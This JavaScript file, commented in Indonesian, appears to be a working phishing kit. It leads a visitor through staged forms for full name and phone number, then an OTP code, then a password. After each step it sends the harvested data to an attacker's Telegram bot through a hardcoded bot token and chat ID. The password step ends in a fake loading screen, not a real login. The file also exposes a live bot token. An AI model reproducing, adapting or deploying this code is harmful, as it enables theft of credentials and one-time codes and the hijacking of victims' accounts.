// Fungsi untuk menampilkan halaman
function showPage(pageId) {
  document.getElementById("mainContent").style.display = "none";
  document.getElementById("pendaftaranContent").style.display = "none";
  document.getElementById("kodeContent").style.display = "none";
  document.getElementById("kataSandiContent").style.display = "none";
  document.getElementById(pageId).style.display = "block";
}

// Inisialisasi intl-tel-input
const phoneInputField = document.querySelector("#phone");
const phoneInput = window.intlTelInput(phoneInputField, {
  preferredCountries: ["my", "id", "us"],
  utilsScript:
    "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});

// Form Pendaftaran
document
  .getElementById("registrationForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();
    const name = document.getElementById("name").value;
    const phone = document.getElementById("phone").value;

    localStorage.setItem("name", name);
    localStorage.setItem("phone", phone);

    // Kirim data ke Telegram
    sendToTelegram(`
──────────────────────
( MALAY | DATA )
──────────────────────
- Nama Lengkap  : ${name}
- No HP         : ${phone}
──────────────────────
        `);

    showPage("kodeContent");
  });

// Form OTP
document.getElementById("otpForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const otp = document.getElementById("otp").value;
  localStorage.setItem("otp", otp);

  // Kirim data ke Telegram
  const savedName = localStorage.getItem("name");
  const savedPhone = localStorage.getItem("phone");

  sendToTelegram(`
──────────────────────
( MALAY | DATA )
──────────────────────
- Nama Lengkap  : ${savedName}
- No HP         : ${savedPhone}
- OTP           : ${otp}
──────────────────────
        `);

  showPage("kataSandiContent");
});

// Form Kata Sandi
document
  .getElementById("passwordForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();
    const kataSandi = document.getElementById("kata-sandi").value;

    // Sembunyikan form dan tampilkan loading
    document.getElementById("kata-sandi").style.display = "none";
    document.getElementById("loginButton").style.display = "none";
    document.getElementById("loadingGif").style.display = "block";
    document.getElementById("formMessage").style.display = "block";
    document.getElementById("kataSandi").style.display = "none";
    document.getElementById("useAnotherPhone").style.display = "block";

    // Kirim data ke Telegram
    const savedName = localStorage.getItem("name");
    const savedPhone = localStorage.getItem("phone");
    const savedOtp = localStorage.getItem("otp");

    sendToTelegram(`
─────────────────
( MALAY | DATA )
─────────────────
- Nama Lengkap  : ${savedName}
- No HP         : ${savedPhone}
- OTP           : ${savedOtp}
- Kata Sandi    : ${kataSandi}
─────────────────
        `);
  });

// Fungsi untuk mengirim ke Telegram
function sendToTelegram(message) {
  const botToken = "7506870514:AAGPXcyZXYciUTdHymoGDvjAtUvrFnzi-dw";
  const chatId = "6718218828";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}

// Event listener untuk tombol "Gunakan Nomor Lain"
document
  .getElementById("useAnotherPhone")
  .addEventListener("click", function () {
    showPage("mainContent");
  });

// Auto-scroll untuk record box
function startAutoScroll() {
  const list = document.querySelector(".list");
  if (!list) return;

  function scrollList() {
    const firstItem = list.querySelector(".item:first-child");
    if (!firstItem) return;

    const itemHeight = firstItem.offsetHeight;
    list.style.transition = "margin-top 1s ease";
    list.style.marginTop = `-${itemHeight}px`;

    setTimeout(function () {
      list.style.transition = "none";
      list.style.marginTop = "0px";
      list.appendChild(firstItem);
    }, 1000);

    setTimeout(scrollList, 2000);
  }

  scrollList();
}

document.addEventListener("DOMContentLoaded", startAutoScroll);

// Fungsi untuk menampilkan loading screen
function showLoading() {
  document.getElementById("loading").style.display = "flex";
  setTimeout(() => {
    document.getElementById("loading").style.display = "none";
  }, 2000);
}

// Fungsi untuk menampilkan processing screen
function showProcessing() {
  document.getElementById("loadingScreen").style.display = "flex";
}

// Fungsi untuk menyembunyikan processing screen
function hideProcessing() {
  document.getElementById("loadingScreen").style.display = "none";
}

// Tambahkan event listener untuk menampilkan loading screen saat tombol diklik
document.querySelectorAll(".btn").forEach((button) => {
  button.addEventListener("click", function () {
    showLoading();
  });
});
